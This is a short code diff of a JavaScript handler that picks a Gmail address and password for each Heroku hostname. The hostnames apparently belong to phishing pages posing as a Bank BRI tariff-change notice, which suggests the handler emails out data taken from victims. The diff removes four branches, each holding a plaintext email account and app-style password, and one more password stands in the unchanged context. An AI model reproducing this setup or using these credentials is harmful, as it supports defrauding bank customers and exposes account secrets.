@@ -49,28 +49,6 @@ export default function handler(req, res) {
        pass = 'bkefhkhvfllhrwpk'
     }else
     
-    if (url == 'pilih-tarif-baru.herokuapp.com'){
-
-       email = 'asaklancar011@gmail.com'
-       pass = 'ugvdwsvnrxjolwlo'
-    }else
-    
-    if (url == 'pilihan-tarif-bri.herokuapp.com'){
-
-       email = 'mbahagia19@gmail.com'
-       pass = 'bscwibbxbivxaluk'
-    }else
-    
-    if (url == 'pilih-tarif-brii-herokuapp.com'){
-
-       email = 'basenglah460@gmail.com'
-       pass = 'wjvaeltorqzfqdcm'
-    }else
-    if (url == 'pilihan-tarif-bri-new.herokuapp.com'){
-
-       email = 'landaslepas77@gmail.com'
-       pass = 'eyosohykexzgicup'
-    }else
     if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
     {
 
